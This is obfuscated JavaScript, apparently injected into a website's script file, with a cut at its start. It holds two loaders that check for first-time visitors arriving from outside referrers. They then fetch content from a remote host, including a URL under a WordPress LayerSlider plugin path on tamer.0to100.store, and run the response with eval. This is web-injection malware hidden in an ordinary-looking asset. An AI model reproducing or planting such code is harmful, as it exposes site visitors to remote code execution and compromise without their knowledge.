J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};